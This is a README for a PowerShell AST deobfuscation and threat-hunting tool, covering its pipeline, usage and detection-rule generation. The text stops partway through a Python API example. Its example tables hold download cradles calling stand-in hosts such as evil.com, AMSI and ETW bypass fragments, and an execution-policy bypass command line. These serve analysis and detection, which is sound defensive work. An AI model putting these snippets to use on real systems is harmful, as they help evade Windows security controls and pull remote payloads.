# PowerShell AST Deobfuscator

<p align="center">
  <img src="docs/assets/banner.svg" alt="PowerShell AST Deobfuscator Banner" width="100%" />
</p>

<p align="center">
  <a href="https://github.com/maya-thorne/powershell-ast-deobfuscator"><img src="https://img.shields.io/badge/Release-v0.21.0-blue.svg?style=flat-square" alt="Release v0.21.0" /></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MT--SRL-emerald.svg?style=flat-square" alt="License MT-SRL" /></a>
  <a href="ROADMAP.md"><img src="https://img.shields.io/badge/Roadmap-Active-purple.svg?style=flat-square" alt="Roadmap Active" /></a>
  <a href="SECURITY.md"><img src="https://img.shields.io/badge/Security-Policy-red.svg?style=flat-square" alt="Security Policy" /></a>
</p>

---

<p align="center">
  <b><a href="#overview">Overview</a></b> &bull;
  <b><a href="#pipeline-architecture">Pipeline Architecture</a></b> &bull;
  <b><a href="#core-capabilities">Core Capabilities</a></b> &bull;
  <b><a href="#repository-structure">Repository Structure</a></b> &bull;
  <b><a href="#verification--tests">Verification &amp; Tests</a></b> &bull;
  <b><a href="#usage">Usage</a></b>
</p>

---

<span id="overview"></span>
## 🔍 Overview

**powershell-ast-deobfuscator** is a compiler-grade Abstract Syntax Tree (AST) parsing and multi-pass deobfuscation engine designed for static reverse engineering, threat hunting, and malware analysis of complex Windows PowerShell scripts.

Modern PowerShell malware heavily exploits multi-layer obfuscation, such as backtick (`` ` ``) token evasion, scattered string concatenation (`+`), format operator (`-f`) template permutations, type accelerator shuffling, reflection unboxing (`.GetMethod().Invoke()`), pipeline encoding loops (`| % { [char]$_ }`), control flow decoy branching, subexpression splits (`$((...))`), case randomization (`iNvOkE-eXpReSsIoN`), nested Base64 command flags, and AMSI/ETW memory patching. This suite models PowerShell syntax directly down to tokens and AST nodes, systematically normalizing obfuscated structures into clean, human-readable source code.

---

<span id="pipeline-architecture"></span>
## 🏛️ Pipeline Architecture

<p align="center">
  <img src="docs/assets/pipeline_architecture.svg" alt="Pipeline Architecture" width="100%" />
</p>

The deobfuscation engine executes a multi-pass fixed-point reduction loop:

1. **Recursive Base64 Encoded Command Unwrapping (`src/encoded_command_unwrapper.py`)**: Recursively extracts and decodes `-EncodedCommand`, `-enc`, and `-e` CLI parameters across command lines and AST `CommandNode` structures with multi-encoding auto-detection (UTF-16LE, UTF-8, UTF-16BE, ASCII), Base64 padding auto-repair, and loop detection.
2. **Lexical Scanning (`src/lexer.py`)**: Tokenizes PowerShell code character-by-character, resolving backtick escape sequences, subexpression tokens (`$(`), string literals, and variable identifiers.
3. **Recursive Descent Parsing (`src/parser.py`)**: Converts token streams into structured AST hierarchies (`ScriptBlockNode`, `PipelineNode`, `FormatOpNode`, `CommandNode`, `SubexpressionNode`, `IndexAccessNode`, `UnaryOpNode`, `DynamicMemberAccessNode`, `DynamicMethodCallNode`, `DynamicStaticMemberAccessNode`, `IfStatementNode`, `WhileStatementNode`, `ForStatementNode`, `ForEachStatementNode`).
4. **Environment &amp; ExecutionContext Inlining (`src/environment_inliner.py`)**: Inlines Windows environment variables (`$env:COMSPEC`, `$env:PATH`), automatic variables (`$PSHOME`, `$ShellId`), preference strings, and unwraps `$ExecutionContext.InvokeCommand` static methods.
5. **Arithmetic &amp; Bitwise Constant Folding (`src/bitwise_folding_engine.py`)**: Evaluates constant bitwise operations (`-bxor`, `-band`, `-bor`, `-shl`, `-shr`, `-bnot`), arithmetic (`+`, `-`, `*`, `/`, `%`), comparison operators, and immediate cast reductions (`[char](0x41 -bxor 0x20)` -> `'a'`).
6. **Static XOR Loop Decryption (`src/xor_loop_decryptor.py`)**: Statically resolves pipeline XOR streams (`@(105, 101, 120) | % { [char]($_ -bxor $k) }`), repeating multi-byte keys, encoding wrappers (`[System.Text.Encoding]::ASCII.GetString(...)`), and imperative `for`/`foreach`/`while` loops with zeroize buffer wiping.
7. **Subexpression Unwrapping &amp; Flattening (`src/subexpression_unwrapper.py`)**: Unboxes redundant subexpression wrappers (`$((('cmd.exe')))`), folds in-subexpression string concatenations, flattens expandable string interpolations, and propagates local assignments.
8. **Casing Randomization Normalization (`src/casing_normalizer.py`)**: Normalizes randomized cmdlet names, 46 approved verbs, 150+ cmdlets and aliases, language keywords, .NET types/accelerators, member methods, and variables into canonical PascalCase or lowercase syntax.
9. **Type Accelerator &amp; Casting Resolver (`src/type_casting_resolver.py`)**: Evaluates type accelerators (`[type]`, `[char[]]`, `[byte[]]`, `[int]`), array index shuffling, reverse slices (`'olleh'[-1..-5] -join ''`), join operators (`-join`), and static .NET conversion methods.
10. **Reflection &amp; Dynamic Member Unwrapping (`src/reflection_unwrapper.py`)**: Statically resolves `.Invoke()`, `::Invoke()`, `GetMethod()`, `GetProperty()`, `GetField()`, dynamic member expressions (`$obj.('Substring')(0, 5)`), and evaluates safe pure .NET methods.
11. **Pipeline Optimization (`src/pipeline_optimizer.py`)**: Evaluates static pipelines: unfolds Foreach mapping blocks (`| % { [char]$_ }`), filters slices and unique values via `Select-Object`, processes `Where-Object` predicates, and simplifies piped commands (`'calc.exe' | iex` -> `iex 'calc.exe'`).
12. **ScriptBlock &amp; Control Flow Simplification (`src/scriptblock_simplifier.py`)**: Inlines invocation wrappers (`& { ... }`, `. { ... }`, `{ ... }.Invoke()`), folds trivial conditional branches (`if ($true)`, `if ($false)`), evaluates static comparisons, and eliminates dead code.
13. **SecureString Decryption &amp; AST Reduction (`src/secure_string_reducer.py`)**: Statically resolves AES encryption keys, decrypts PowerShell `76492d11...` envelopes, unwraps Marshal BSTR and credential password access, and scrubs sensitive memory buffers.
14. **Recursive IEX Unwrapping (`src/iex_unwrapper.py`)**: Recursively detects and peels nested `iex`, `Invoke-Expression`, call/dot operator executions, ScriptBlock API invocations (`[scriptblock]::Create($code).Invoke()`), and multi-stage pipeline streams (`... | iex | iex`), peeling execution layers down to raw payloads while preserving download cradles and guarding against recursion loops.
15. **AMSI &amp; ETW Bypass Detection &amp; Neutralization (`src/amsi_etw_signatures.py`, `src/amsi_etw_detector.py`)**: Scans for memory patching (`AmsiScanBuffer`, `EtwEventWrite`, `WLDP`) and reflection tampering (`amsiInitFailed`, `etwProvider`, `m_enabled`, `cachedGroupPolicySettings`), outputting forensic telemetry and surgically neutralizing bypass code blocks.
16. **AST Normalization &amp; Constant Folding (`src/normalizer.py`)**: Inlines string formats (`-f`), collapses string concatenations, strips parentheses artifacts, reduces call operators, and serializes clean syntax.
17. **PowerShell 7+ (Core / pwsh) AST Extensions &amp; Operator Reduction (`src/pwsh7_reducer.py`, `src/pwsh7.py`)**: Recognizes and reduces PowerShell 7+ null-coalescing (`??`), null-coalescing assignment (`??=`), and ternary (`?:`) operators with right-associative precedence, static truthiness and nullness branch pruning, and dead code elimination.
17. **Fixed-Point Convergence (`src/deobfuscator_engine.py`)**: Iterates reduction passes until the code reaches a stable, non-mutating fixed point.
18. **DownloadString &amp; WebClient API URL Carving (`src/webclient_tracer.py`)**: Statically traces and extracts remote payload download cradles, decodes obfuscated DWORD/hex/octal IPs, binds headers and proxies, and outputs normalized URLs.
19. **Automated Benchmark Harness &amp; Telemetry (`src/benchmark.py`)**: Runs evaluation over a 30-sample corpus across 10 categories, calculating Shannon entropy, artifact removal, ground-truth indicator recall, and composite fidelity score.
20. **YARA &amp; Sigma Threat Hunting Rule Synthesizer (`src/threat_rule_generator.py`)**: Extracts high-fidelity indicators (C2 URLs, AMSI/ETW hooks, memory injection APIs, execution cradles, persistence mechanisms) across raw and AST-deobfuscated payloads, synthesizing correlated YARA 4.x rules and SigmaHQ YAML detection rules targeting ScriptBlock Logging (EID 4104), Module Logging (EID 4103), and Process Creation (EID 4688).
21. **In-Memory Compressed Stream Decompression (`src/compression_reducer.py`, `src/compression_decompressor.py`)**: Statically unpacks .NET in-memory compressed streams (`[IO.Compression.GZipStream]`, `[IO.Compression.DeflateStream]`, `BrotliStream`) wrapped around `[IO.MemoryStream]`, `[Convert]::FromBase64String`, byte arrays, and `[IO.StreamReader]::ReadToEnd()` or `[System.Text.Encoding]::GetString()`, resolving multi-step variable assignment chains, RFC 1951 raw deflate / RFC 1952 gzip payloads, multi-encoding auto-detection, and memory buffer zeroization.
22. **Variable Scope Chain &amp; Lifecycle Analysis (`src/scope_chain.py`, `src/variable_scope_inliner.py`)**: Hierarchical scope frame management (Global, Script, Local, Private, Function, ScriptBlock), private variable boundary isolation, variable shadowing detection, Def-Use chain tracking, cmdlet-based variable mapping (`Set-Variable`, `Get-Variable`, `New-Variable`, `Clear-Variable`, `Remove-Variable`), constant propagation respecting lexical scopes, and side-effect-free dead variable assignment elimination.
23. **Runtime ExecutionPolicy Simulation &amp; Neutralization (`src/policy_simulator.py`, `src/policy_reducer.py`)**: Simulates the 5 PowerShell configuration scopes (MachinePolicy GPO, UserPolicy GPO, Process environment, CurrentUser HKCU, LocalMachine HKLM), evaluates precedence rules, identifies execution policy bypasses (`-ExecutionPolicy` CLI flags, `$env:PSExecutionPolicyPreference`, `Set-ExecutionPolicy` cmdlets, in-memory reflection `AuthorizationManager` tampering, and Alternate Data Streams `Zone.Identifier` stripping), calculates threat risk metrics, and surgically neutralizes bypass commands (comment wrapping, statement stripping, or policy inversion).
24. **Regression Stress Fuzzing &amp; Mutation Engine (`src/fuzz_mutator.py`, `src/fuzz_runner.py`, `src/fuzzing.py`)**: Tests parser, lexer, normalizer, and deobfuscation engine resilience against 14 randomized and adversarial mutation strategies (backtick evasion, casing permutations, format string shuffling, string chunk concatenation, deep nesting stress, unicode edges, and dead code injection) with delta-debugging reproducer shrinking, idempotency verification, and multi-format reporting.

---

<span id="core-capabilities"></span>
## ⚡ Core Capabilities

| Capability | Obfuscated Example | Deobfuscated Output |
|---|---|---|
| **Regression Stress Fuzzing Harness** | `pwsh-ast --fuzz --fuzz-iterations 50` | 14 mutation strategies, delta-debugging shrinker &amp; zero unhandled crash verification |
| **ExecutionPolicy Simulation &amp; Neutralization** | `$env:PSExecutionPolicyPreference = 'Bypass'` | `<# [NEUTRALIZED EXECUTION POLICY BYPASS: ENV_VAR] ... #>` or simulated scope matrix |
| **Backtick Evasion Stripping** | `In`voke-Exp`ression 'Get-Process'` | `Invoke-Expression 'Get-Process'` |
| **Format Operator (`-f`) Folding** | `'{1}{0}' -f 'World', 'Hello '` | `'Hello World'` |
| **String Concatenation Reduction** | `'Down' + 'load' + 'String'` | `'DownloadString'` |
| **Environment Variable Inlining** | `$env:COMSPEC[4, 15, 25] -join ''` | `'iex'` |
| **Call Operator Simplification** | `& ($env:COMSPEC[4, 15, 25] -join '') 'calc.exe'` | `iex 'calc.exe'` |
| **Preference Variable Inlining** | `$VerbosePreference.ToString()[1, 3] -join ''` | `'ie'` |
| **ExecutionContext Unwrapping** | `$ExecutionContext.InvokeCommand.InvokeScript('Get-Date')` | `Get-Date` |
| **Reflection Method Unwrapping** | `[System.IO.File].GetMethod('ReadAllText').Invoke($null, @('C:\test.txt'))` | `[System.IO.File]::ReadAllText('C:\test.txt')` |
| **Instance Reflection Invocation** | `$wc.GetType().GetMethod('DownloadString').Invoke($wc, @('http://example.com'))` | `$wc.DownloadString('http://example.com')` |
| **Dynamic Member Access** | `'hello'.('Substring')(1, 3)` | `'ell'` |
| **Dynamic Static Member Access** | `[System.Math]::('Max')(10, 20)` | `20` |
| **Reflection Property/Field Get** | `[System.AppDomain].GetProperty('CurrentDomain').GetValue($null, $null)` | `[System.AppDomain]::CurrentDomain` |
| **Pipeline Foreach Evaluation** | `(105, 101, 120 | % { [char]$_ }) -join ''` | `'iex'` |
| **Select-Object Filtering** | `@(10, 20, 30, 40) | select -First 2` | `@(10, 20)` |
| **Where-Object Predicates** | `@(1, 5, 10, 15) | ? { $_ -gt 5 }` | `@(10, 15)` |
| **ScriptBlock Call Inlining** | `& { iex 'calc.exe' }` | `iex 'calc.exe'` |
| **Condition Branch Reduction** | `if ($true) { iex 'calc.exe' } else { 'decoy' }` | `iex 'calc.exe'` |
| **Piped Command Simplification** | `'calc.exe' | iex` | `iex 'calc.exe'` |
| **AST Tree & Diagram Export** | `pwsh-ast script.ps1 --mermaid` | Hierarchical Unicode tree, Mermaid flowchart, DOT, JSON |
| **Type Accelerator Unfolding** | `[string][char[]](73, 69, 88)` | `'IEX'` |
| **Array Slicing &amp; Reversal** | `('olleh'[-1..-5] -join '')` | `'hello'` |
| **Index Shuffling Reduction** | `[char[]](88, 69, 73)[2, 1, 0] -join ''` | `'IEX'` |
| **Encoding Decryption Folding** | `[System.Text.Encoding]::ASCII.GetString([byte[]](73, 69, 88))` | `'IEX'` |
| **SecureString Decryption** | `ConvertTo-SecureString $enc -Key (1..16)` | `'Decrypted String Literal'` |
| **Marshal &amp; Credential Unboxing** | `[Marshal]::PtrToStringAuto([Marshal]::SecureStringToBSTR($sec))` | `'Decrypted String Literal'` |
| **Nested Composite Resolution** | `('{1}{0}' -f ('l'+'d'), ('Wor'+''))` | `'World'` |
| **Base64 EncodedCommand Decode** | `powershell.exe -enc VwBy...` | `Write-Host "Success"` |
| **Nested Base64 Recursive Unwrapping** | `powershell.exe -NoP -enc <b64_nested>` | Innermost decoded and AST-normalized script |
| **Subexpression Unwrapping** | `$((('c' + 'alc' + '.exe')))` | `'calc.exe'` |
| **Casing Randomization Normalization** | `iNvOkE-eXpReSsIoN` | `Invoke-Expression` |
| **Type Casing Restoration** | `[sYsTeM.nEt.wEbClIeNt]` | `[System.Net.WebClient]` |
| **Expandable String Inlining** | `"prefix $( 'cmd' ) suffix"` | `"prefix cmd suffix"` |
| **WebClient URL Carving** | `(New-Object Net.WebClient).('Down'+'loadString')('h'+'ttp://evil.com/x.ps1')` | Normalized URL `http://evil.com/x.ps1`, method `DownloadString`, cradle `iex_download_string` |
| **Obfuscated IP Auto-Decoding** | `(New-Object Net.WebClient).DownloadString('http://2130706433:8080/p.ps1')` | Host decoded to `127.0.0.1`, canonical URL `http://127.0.0.1:8080/p.ps1` |
| **Download Cmdlet Resolution** | `Invoke-WebRequest -Uri 'http://c2.net/x.exe' -OutFile '$env:temp\x.exe'` | Carved target with destination `x.exe`, api `Cmdlet`, cradle `cmdlet_download` |
| **Recursive IEX Peeling** | `iex (iex (iex 'calc.exe'))` | `'calc.exe'` |
| **ScriptBlock API Invocations** | `[scriptblock]::Create('calc.exe').Invoke()` | `'calc.exe'` |
| **IEX Layer Tracing Telemetry** | `pwsh-ast script.ps1 --trace-iex` | Structured JSON layer telemetry with vectors and payload hashes |
| **Automated Benchmark Harness** | `pwsh-ast --benchmark` | 30-sample corpus evaluation, recall, entropy, and fidelity telemetry |
| **AMSI Memory Patch Detection** | `[Win32]::VirtualProtect($addr, 5, 0x40, [ref]$p); [Marshal]::Copy($patch, 0, $addr, 1)` | Forensic finding `AMSI-MEM-001` (AmsiScanBuffer Memory Patching, Critical) |
| **ETW EventWrite Patch Detection** | `[Win32]::GetProcAddress($ntdll, 'EtwEventWrite'); ... [Marshal]::Copy(@(0xc3), 0, $addr, 1)` | Forensic finding `ETW-MEM-001` (EtwEventWrite Memory Patching, Critical) |
| **amsiInitFailed Reflection Tampering** | `[Ref].Assembly.GetType('...AmsiUtils').GetField('amsiInitFailed', ...).SetValue($null, $true)` | Forensic finding `AMSI-REFL-001` (amsiInitFailed Reflection Tampering, Critical) |
| **cachedGroupPolicySettings Tampering** | `[Utils].GetField('cachedGroupPolicySettings', ...).GetValue($null)['ScriptBlockLogging'] = 0` | Forensic finding `LOG-REFL-001` (cachedGroupPolicySettings Reflection Tampering) |
| **Forensic Neutralization &amp; Sanitization** | `pwsh-ast malware.ps1 --neutralize-amsi` | Active bypass statements sanitized into `<# [NEUTRALIZED: ...] ... #>` comments |
| **YARA 4.x Threat Rule Synthesis** | `pwsh-ast malware.ps1 --generate-yara` | Synthesizes high-fidelity YARA rules with category prefixes, hex byte patterns, and condition trees |
| **SigmaHQ Detection Rule Generation** | `pwsh-ast malware.ps1 --generate-sigma` | Generates standardized Sigma YAML rules for EID 4104 (ScriptBlock), EID 4103, and EID 4688 |
| **Correlated Threat Ruleset Bundle** | `pwsh-ast malware.ps1 --generate-rules --rule-target dual` | Emits correlated YARA/Sigma bundle with dual-mode raw/deobfuscated strings and MITRE tags |
| **In-Memory GZip Stream Unpacking** | `(New-Object IO.StreamReader(New-Object IO.Compression.GZipStream(New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sI...')), 1))).ReadToEnd()` | `Write-Output "Payload Decompressed"` |
| **Raw Deflate Stream Unpacking** | `[System.Text.Encoding]::UTF8.GetString((New-Object IO.Compression.DeflateStream(New-Object IO.MemoryStream($rawBytes), 0)).ToArray())` | `Invoke-Expression 'Get-Process'` |
| **Multi-Step Stream Assignment Reduction** | `$ms = New-Object IO.MemoryStream(,$bytes); $gz = New-Object IO.Compression.GZipStream($ms, 0); ...` | Consolidated inline string payload expression |
| **Variable Scope Resolution** | `$global:k = 'payload'; & { $x = $global:k; $x }` | `'payload'` |
| **Variable Cmdlet Unwrapping** | `Set-Variable -Name 'cmd' -Value 'iex'; Get-Variable cmd -ValueOnly` | `'iex'` |
| **Scope Forensics &amp; Telemetry** | `pwsh-ast script.ps1 --scope-analysis` | Hierarchical scope tree, symbols table, def-use chains, and shadowing detection |

---

<span id="repository-structure"></span>
## 📁 Repository Structure

| Path | Role &amp; Technical Scope |
|---|---|
| `src/tokens.py` | Token definitions, token types enum, and lexical boundary models |
| `src/lexer.py` | Character-level PowerShell tokenizer and backtick escape processor |
| `src/ast_nodes.py` | Abstract Syntax Tree node hierarchy definitions |
| `src/parser.py` | Recursive descent syntax tree parser |
| `src/normalizer.py` | AST constant folding, `-f` inlining, and clean source code serializer |
| `src/bitwise_folding_engine.py` | Arithmetic and bitwise operator static constant folding engine |
| `src/xor_loop_decryptor.py` | Static XOR decryption loop, repeating-key cipher evaluator & memory wiper |
| `src/subexpression_unwrapper.py` | Subexpression $(...) unboxing, redundant nesting elimination &amp; expandable string inliner |
| `src/casing_normalizer.py` | Canonical cmdlet, verb, keyword, type accelerator, member &amp; variable casing normalizer |
| `src/ast_visualizer.py` | AST visualizer, Unicode and ASCII hierarchical tree renderer |
| `src/ast_exporter.py` | AST diagram generator, Mermaid, Graphviz DOT, JSON &amp; metrics exporter |
| `src/encoded_command_unwrapper.py` | Base64 encoded command recursive unwrapper, multi-encoding detector &amp; entropy telemetry |
| `src/type_accelerators.py` | PowerShell type accelerator dictionary, normalization &amp; .NET reflection metadata |
| `src/type_casting_resolver.py` | Evaluator for type casts, array index shuffling, reverse slices, and join operations |
| `src/environment_inliner.py` | Windows environment variables, automatic variables &amp; ExecutionContext inlining engine |
| `src/reflection_unwrapper.py` | Reflection .Invoke(), ::Invoke(), GetMethod(), GetProperty(), GetField() &amp; pure .NET evaluator |
| `src/pipeline_optimizer.py` | Pipeline stages, Foreach conversion, Select filtering, Where predicates &amp; Out-String |
| `src/scriptblock_simplifier.py` | ScriptBlock unwrapping (&, ., .Invoke()), trivial conditionals &amp; dead code elimination |
| `src/secure_string_crypto.py` | SecureString envelope parsing, AES-CBC decryption, and buffer zeroization |
| `src/static_key_extractor.py` | Static AES key extractor from ranges, array literals, byte casts, and variables |
| `src/secure_string_reducer.py` | AST reducer for ConvertTo-SecureString, Marshal BSTR, and credential objects |
| `src/benchmark_corpus.py` | Curated 30-sample representative real-world obfuscated PowerShell corpus across 10 categories |
| `src/benchmark_metrics.py` | Shannon entropy, artifact detection, ground-truth recall, AST validity &amp; fidelity scoring |
| `src/benchmark_runner.py` | Automated batch test runner, execution timer, and Text/JSON/Markdown report generator |
| `src/benchmark.py` | Unified public facade for the automated benchmark suite |
| `src/webclient_tracer.py` | WebClient, HttpClient, download cmdlet static tracer &amp; remote payload URL carving engine |
| `src/iex_unwrapper.py` | Recursive IEX (Invoke-Expression) wrapper tracking, peeling engine &amp; execution layer telemetry |
| `src/amsi_etw_signatures.py` | AMSI &amp; ETW bypass detection ruleset, categories, severity tiers &amp; finding data models |
| `src/amsi_etw_detector.py` | Memory patch &amp; reflection tampering detector, forensic telemetry, and surgical neutralization engine |
| `src/rule_models.py` | Threat indicator taxonomy, MITRE ATT&CK catalog, rule metadata &amp; synthesis options |
| `src/indicator_extractor.py` | High-fidelity IoC &amp; behavioral threat indicator extractor from raw &amp; AST deobfuscated code |
| `src/yara_generator.py` | YARA 4.x detection rule synthesizer with category string prefixes, hex byte patterns &amp; balanced conditions |
| `src/sigma_generator.py` | SigmaHQ YAML detection rule generator for ScriptBlock Logging (EID 4104) &amp; Process Creation (EID 4688) |
| `src/threat_rule_generator.py` | Unified threat hunting facade coordinating indicator extraction, YARA &amp; Sigma rule synthesis |
| `src/compression_models.py` | Compression algorithm enums, stream encoding models, and layer telemetry schemas |
| `src/compression_decompressor.py` | RFC 1951 Deflate, RFC 1952 Gzip, Brotli decompressors, encoding heuristics & buffer zeroize |
| `src/compression_reducer.py` | AST reducer for one-liner and multi-step .NET MemoryStream/GZipStream/DeflateStream pipelines |
| `src/compression.py` | Public facade coordinating compressed stream AST reduction and telemetry tracing |
| `src/scope_models.py` | Variable scope enums, symbol definitions, frame models, and telemetry summary schema |
| `src/scope_chain.py` | Lexical &amp; runtime scope frame hierarchy, private variable isolation, and def-use chain tracking |
| `src/variable_lifecycle_tracker.py` | AST traversal engine tracking assignments, reads, loops, functions, and variable cmdlets |
| `src/variable_scope_inliner.py` | Scope-aware constant propagation, cmdlet unboxing &amp; dead variable elimination |
| `src/variable_scope.py` | Unified public facade for variable scope analysis, constant inlining, and telemetry export |
| `src/policy_models.py` | PowerShell execution policy enums, scopes, findings, scope state matrix & transition telemetry |
| `src/policy_simulator.py` | Multi-scope execution policy simulator, CLI flag parser, GPO precedence solver & bypass scanner |
| `src/policy_reducer.py` | Execution policy bypass surgical neutralizer (comment, strip, invert) & statement rewriter |
| `src/execution_policy.py` | Unified public facade for policy simulation, bypass detection, neutralization, and reporting |
| `src/fuzz_models.py` | Mutation strategy enums, fuzz test case schemas, execution result telemetry & summary models |
| `src/fuzz_mutator.py` | Deterministic script mutator supporting 14 lexical, syntactic & structural mutation strategies |
| `src/fuzz_runner.py` | Automated regression fuzzing harness, delta-debugging shrinker & multi-format report generator |
| `src/fuzzing.py` | Unified public facade for regression stress fuzzing, script mutation & report formatting |
| `src/batch_models.py` | Forensic scan status, risk tier enums, per-file telemetry schemas, batch options & summary formatters |
| `src/batch_scanner.py` | Safe directory traversal, symlink loop protection, extension filtering, max size guards & multi-encoding reader |
| `src/batch_runner.py` | Multithreaded parallel analyzer, per-script timeout protection, error isolation, risk scoring & report generators |
| `src/batch.py` | Unified public facade for batch directory and file scanning, and CLI execution dispatcher |
| `src/deobfuscator_engine.py` | Multi-pass fixed-point convergence engine with AMSI/ETW bypass integration, variable scope inlining &amp; threat rule generation |
| `src/cli.py` | Command-line interface with AST visualization, benchmark runner, URL carver, AMSI/ETW scanner, scope analyzer, YARA/Sigma synthesizer, fuzzing runner &amp; batch directory scanner |
| `tests/` | Comprehensive test suite (517 unit tests) covering lexer, parser, normalizer, crypto, URL carving, IEX peeling, AMSI/ETW detector, threat rules, compressed streams, variable scope analysis, policy simulator, fuzzing &amp; batch scanner |
| `ROADMAP.md` | Public development milestones and engineering roadmap |
| `SECURITY.md` | Vulnerability disclosure policy and reporting process |

---

<span id="verification--tests"></span>
## 📊 Verification &amp; Tests

Run the full automated test suite:

```bash
python -m unittest discover tests -v
```

All 517 unit tests execute with zero failures:

```text
Ran 517 tests in 3.345s

OK
```

---

<span id="usage"></span>
## 🚀 Usage

### Command-Line Interface

Deobfuscate a raw string or file:

```bash
# Direct inline string deobfuscation
python -m src.cli "('{1}{0}' -f 'World', 'Hello ')"

# Script file input with output redirection
python -m src.cli malicious_sample.ps1 -o cleaned_sample.ps1

# Inspect token stream
python -m src.cli "Invoke-Expression" --tokens

# Subexpression and casing normalization (active by default)
python -m src.cli "iNvOkE-eXpReSsIoN `$((('calc.exe')))"
# Output: Invoke-Expression 'calc.exe'

# Recursive IEX peeling (peels nested wrappers down to payload)
python -m src.cli "iex (iex (iex 'calc.exe'))"
# Output: 'calc.exe'

# Trace layered IEX unwrapping telemetry as structured JSON
python -m src.cli sample.ps1 --trace-iex

# In-memory compressed stream decompression & JSON telemetry (active by default)
python -m src.cli compressed_payload.ps1 --trace-streams

# Disable specific passes if raw casing, subexpression, IEX, or stream decompression syntax is required
python -m src.cli sample.ps1 --no-normalize-casing --no-unwrap-subexpr --no-unwrap-iex --no-decompress-streams
```

#### Automated Benchmark Harness

Run automated deobfuscation accuracy and fidelity benchmarks across the curated 30-sample corpus:

```bash
# Run full 30-sample benchmark suite (default text table)
python -m src.cli --benchmark

# Run benchmark for a specific sample ID
python -m src.cli --benchmark-sample SAMPLE-01

# Run benchmark for an entire evasion category
python -m src.cli --benchmark-category "Format Operator Shuffle"

# Export benchmark telemetry as JSON or Markdown report
python -m src.cli --benchmark --benchmark-format markdown --benchmark-report docs/benchmark_report.md
python -m src.cli --benchmark --benchmark-format json --benchmark-report docs/benchmark_report.json
```

#### AST Visualization &amp; Export

Visualize or export the Abstract Syntax Tree into multiple formats:

```bash
# Render hierarchical Unicode tree (default --ast)
python -m src.cli "$x = 'test' + 'ing'" --ast

# Render plain ASCII tree
python -m src.cli "$x = 'test' + 'ing'" --ascii

# Export as Mermaid flowchart diagram
python -m src.cli "if ($true) { Get-Process } else { Get-Service }" --mermaid

# Export as Graphviz DOT graph
python -m src.cli "Get-Process | Out-String" --dot

# Export as structured JSON tree
python -m src.cli "Get-Process | Out-String" --json -o ast_dump.json

# Extract structural AST metrics & complexity statistics
python -m src.cli "Get-Process | Out-String" --stats
```

#### Remote Payload URL Carving &amp; Cradle Tracing

Statically carve remote payload download URLs, decode obfuscated IPs, and extract cradle telemetry:

```bash
# Print unique canonical payload URLs (one per line)
python -m src.cli sample.ps1 --urls

# Dump complete forensic telemetry with method, headers, proxy, and cradle type (JSON)
python -m src.cli sample.ps1 --carve-urls -o carved_targets.json
```

#### AMSI &amp; ETW Bypass Detection &amp; Neutralization

Inspect, detect, and sanitize in-memory patches and reflection tampering:

```bash
# Dump all registered AMSI and ETW detection signatures (JSON)
python -m src.cli --amsi-signatures

# Detect AMSI and ETW bypass patterns across input script (structured JSON telemetry)
python -m src.cli sample.ps1 --detect-amsi

# Neutralize and sanitize detected bypass statements into forensic comments
python -m src.cli sample.ps1 --neutralize-amsi -o sanitized_sample.ps1
```

#### YARA &amp; Sigma Threat Hunting Rule Synthesis

Synthesize high-fidelity detection rules from deobfuscated payload indicators:

```bash
# Generate compliant YARA 4.x detection rule to stdout
python -m src.cli sample.ps1 --generate-yara

# Generate YARA rule with custom rule identifier and output file
python -m src.cli sample.ps1 --generate-yara --rule-name "Emotet_Downloader_Stage" -o emotet.yar

# Generate SigmaHQ YAML rule targeting PowerShell ScriptBlock Logging (EID 4104)
python -m src.cli sample.ps1 --generate-sigma --sigma-logsource scriptblock -o sigma_rule.yml

# Generate SigmaHQ YAML rule targeting Process Creation (EID 4688 / Sysmon 1)
python -m src.cli sample.ps1 --generate-sigma --sigma-logsource process_creation

# Generate complete correlated threat hunting bundle (YARA + Sigma + telemetry JSON)
python -m src.cli sample.ps1 --generate-rules --rule-target dual

# Save both .yar and .yml rules into a dedicated rules directory
python -m src.cli sample.ps1 --generate-rules --rule-output-dir rules/
```

#### Runtime ExecutionPolicy Simulation &amp; Neutralization

Simulate multi-scope policy precedence and neutralize execution policy evasion:

```bash
# Simulate runtime ExecutionPolicy and print forensic report
python -m src.cli sample.ps1 --policy-analysis

# Output full simulation state matrix and findings as structured JSON
python -m src.cli sample.ps1 --policy-json

# Export structured policy telemetry to JSON destination file
python -m src.cli sample.ps1 --export-policy-json policy_report.json

# Simulate against active Group Policy MachinePolicy enforcement
python -m src.cli sample.ps1 --policy-analysis --machine-policy Restricted

# Surgically neutralize bypass statements (comment wrapping)
python -m src.cli sample.ps1 --neutralize-policy -o sanitized.ps1

# Evaluate PowerShell CLI launch string for execution policy bypasses
python -m src.cli --cli-eval "powershell.exe -ExecutionPolicy Bypass -NoProfile -File payload.ps1"
```

#### Batch Forensic Automation & Mass Script Scanning

Scan an entire directory of PowerShell scripts in parallel, perform automated threat analysis, score risk tiers, export deobfuscated payloads, and extract IoCs:

```bash
# Scan all scripts in a directory using 8 parallel worker threads (default ASCII table)
python -m src.cli --batch ./malware_corpus --batch-workers 8

# Output detailed Markdown report and save to file
python -m src.cli --batch ./samples --batch-format markdown --batch-report docs/forensic_report.md

# Mass deobfuscate scripts to output directory preserving relative structure
python -m src.cli --scan-dir ./samples --batch-output ./deobfuscated_out --batch-workers 4

# Export extracted IoCs (URLs, C2 endpoints, file hashes) as structured JSON
python -m src.cli --batch ./samples --batch-output ./out --batch-export-iocs

# Filter results by minimum risk tier (clean, suspicious, malicious)
python -m src.cli --batch ./samples --batch-min-risk suspicious --batch-format csv --batch-report report.csv
```

### Python API

```python
from src.deobfuscator_engine import PowerShellDeobfuscator
from src.iex_unwrapper import unwrap_iex, trace_iex_layers
from src.amsi_etw_detector import detect_amsi_etw, neutralize_amsi_etw
from src.threat_rule_generator import ThreatRuleGenerator, generate_yara_rule, generate_sigma_rule
from src.ast_visualizer import render_ast_tree
from src.ast_exporter import export_ast_mermaid, export_ast_json, extract_ast_metrics
from src.benchmark import run_benchmark, to_text_report, to_markdown_report
from src.webclient_tracer import trace_webclient, extract_download_urls

# 1. Multi-pass deobfuscation
engine = PowerShellDeobfuscator()
raw_code = "In`voke-Exp`ression ('{1}{0}' -f 'ing', 'DownloadStr')"
cleaned_code = engine.deobfuscate(raw_code)
print(cleaned_code)
# Output: Invoke-Expression 'DownloadString'

# 2. Automated YARA & Sigma Threat Hunting Rule Generation
